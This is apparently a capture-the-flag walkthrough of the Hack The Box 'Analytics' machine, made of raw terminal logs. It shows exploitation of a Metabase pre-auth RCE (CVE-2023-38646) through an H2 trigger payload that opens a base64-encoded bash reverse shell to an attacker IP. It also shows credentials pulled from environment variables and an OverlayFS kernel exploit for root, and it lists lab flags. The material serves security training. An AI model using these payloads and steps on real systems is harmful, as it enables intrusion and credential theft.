
```
nmap -Pn -p- --min-rate 5000 $ip
Host is up (7.4s latency).
Not shown: 64963 filtered tcp ports (no-response), 570 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
on port 80 found
```
due@analytical.com
(+71) 9876543210
http://data.analytical.htb/ login Metabase
```
Now i will look for public cve for Metabase
I found 
`http://data.analytical.htb/api/session/properties` also found " CVE-2023-38646 - Metabase Pre-auth RCE"
exploit : https://github.com/kh4sh3i/CVE-2023-38646
exploit : https://github.com/securezeron/CVE-2023-38646
The second exploit give me :
```
┌──(root㉿1337)-[/home/…/HacktheBox/Season/exploits/CVE-2023-38646]
└─# python3 CVE-2023-38646-POC.py --ip data.analytical.htb
Failed to connect using HTTPS for data.analytical.htb. Trying next protocol...
None. Vulnerable Metabase Instance:-
             IP: data.analytical.htb
             Setup Token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f


```

Tried this but not work
```
└─# python3 CVE-2023-38646-Reverse-Shell.py --rhost http://data.analytical.htb --lhost 10.10.16.46 --lport 1337
[DEBUG] Original rhost: http://data.analytical.htb
[DEBUG] Preprocessed rhost: http://data.analytical.htb
[DEBUG] Input Arguments - rhost: http://data.analytical.htb, lhost: 10.10.16.46, lport: 1337
[DEBUG] Fetching setup token from http://data.analytical.htb/api/session/properties...
[DEBUG] Setup Token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
[DEBUG] Version: v0.46.6
[DEBUG] Setup token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
[DEBUG] Payload = YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE2LjQ2LzEzMzcgMD4mMQ==
[DEBUG] Sending request to http://data.analytical.htb/api/setup/validate with headers {'Content-Type': 'application/json'} and data {
    "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
    "details": {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules": {},
        "details": {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE2LjQ2LzEzMzcgMD4mMQ==}|{base64,-d}|{bash,-i}')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "test",
        "engine": "h2"
    }
}
[DEBUG] Response received: {"message":"Vector arg to map conj must be a pair"}
[DEBUG] POST to http://data.analytical.htb/api/setup/validate failed with status code: 400
```
But this work

```
└─# python3 CVE-2023-38646-Reverse-Shell.py --rhost data.analytical.htb --lhost 10.10.16.46 --lport 443
└─# nc -lvnp 443 
listening on [any] 443 ...
connect to [10.10.16.46] from (UNKNOWN) [10.10.11.233] 34686
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
a9c1c8064bd9:/$ 


```

## PrivEsc
found : metabase.db
Used Linpeas nothing. exploit suggester nothing 
using linenum i found
```
### ENVIRONMENTAL #######################################
[-] Environment information:
SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=a9c1c8064bd9
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/tmp/Priv
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
TERM=xterm
USER=metabase
SHLVL=5
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
OLDPWD=/tmp
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
```
I will try to login on ssh using these creds.
Connected on ssh using these creds. :)
```
metalytics@analytics:~$ cat user.txt
e32f7a59fd38a629760fa3b6f195d4b4
```

## Root PrivEsc

```
Files with capabilities (limited to 50):
/dev/shm/u/python3 cap_setuid=eip
/dev/shm/u/python3 cap_setuid=eip is writable
/dev/shm/l/python3 cap_setuid=eip
/dev/shm/l/python3 cap_setuid=eip is writable
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
```
```
╔══════════╣ Checking if containerd(ctr) is available
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation
ctr was found in /usr/bin/ctr, you may be able to escalate privileges with it
ctr: failed to dial "/run/containerd/containerd.sock": connection error: desc = "transport: error while dialing: dial unix /run/containerd/containerd.sock: connect: permission denied"

╔══════════╣ Checking if runc is available
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/runc-privilege-escalation
runc was found in /usr/bin/runc, you may be able to escalate privileges with it
```
found an private key
`cat /var/lib/fwupd/pki/secret.key`

Then i use uname -a to find the version is vulnerable to OverlayFs
Link : https://github.com/briskets/CVE-2021-3493.git
On my local machine i used gcc to compile it and send it to victime machine
the chmod and run
```
bash-5.1# cat root.txt
0c5fff097346e62aa45c4174645be371
bash-5.1#
```